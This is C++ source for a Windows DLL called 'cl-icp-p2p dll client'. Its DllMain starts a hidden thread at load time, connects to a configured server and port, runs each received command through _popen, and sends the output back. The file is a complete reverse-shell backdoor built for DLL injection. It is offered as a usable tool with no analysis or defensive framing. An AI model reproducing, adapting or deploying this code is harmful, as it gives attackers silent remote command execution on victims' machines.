/*

    cl-icp-p2p dll client
    made by @lemontoe_ on discord
    https://github.com/lemontoe

*/

#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <string>
#include <cstdlib>
#include <windows.h>

#pragma comment(lib, "Ws2_32.lib")

HANDLE hClientThread = NULL;

const char* SERVER_IP = "0.0.0.0"; // Server IP
const int SERVER_PORT = 9999; // Server Port

// Main client function
extern "C" __declspec(dllexport) void startClient() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        MessageBox(NULL, L"WSAStartup failed", L"Error", MB_OK | MB_ICONERROR);
        return;
    }

    SOCKET clientSocket = INVALID_SOCKET;
    struct sockaddr_in serverAddr;
    char recvBuffer[4096];
    int recvSize;

    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET) {
        WSACleanup();
        return;
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, SERVER_IP, &serverAddr.sin_addr);

    // MessageBox(NULL, L"Attempting to connect to the server...", L"Notification", MB_OK);

    // Connect to server
    if (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        closesocket(clientSocket);
        WSACleanup();
        return;
    }

    while (true) {
        recvSize = recv(clientSocket, recvBuffer, sizeof(recvBuffer) - 1, 0);
        if (recvSize <= 0) {
            break;
        }

        recvBuffer[recvSize] = '\0';
        std::string command(recvBuffer);

        if (command == "exit") {
            PostThreadMessage(GetThreadId(hClientThread), WM_QUIT, 0, 0);
            break;
        }

        std::string result;
        char buffer[128];
        FILE* pipe = _popen(command.c_str(), "r");
        if (!pipe) {
            result = "Error executing command";
        }
        else {
            while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
                result += buffer;
            }
            _pclose(pipe);
        }

        send(clientSocket, result.c_str(), result.length(), 0);
    }

    // Cleanup
    closesocket(clientSocket);
    WSACleanup(); 
}

DWORD WINAPI StartClientThread(LPVOID lpParam) {
    try {
        startClient();
    }
    catch (const std::exception& e) {
        MessageBoxA(NULL, e.what(), "Exception", MB_OK | MB_ICONERROR);
    }
    catch (...) {
        MessageBoxA(NULL, "Unknown error occurred", "Exception", MB_OK | MB_ICONERROR);
    }
    return 0;
}

// HANDLE hThread = CreateThread(NULL, 0, StartClientThread, NULL, 0, NULL);

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        // MessageBox(NULL, L"DLL Loaded", L"Notification", MB_OK);
        hClientThread = CreateThread(NULL, 0, StartClientThread, NULL, 0, NULL);
        if (hClientThread == NULL) {
            MessageBox(NULL, L"Failed to create thread", L"Error", MB_OK | MB_ICONERROR);
        }
        break;
    case DLL_PROCESS_DETACH:
        if (hClientThread) {
            WaitForSingleObject(hClientThread, INFINITE);
            CloseHandle(hClientThread);
        }
        break;
    }
    return TRUE;
}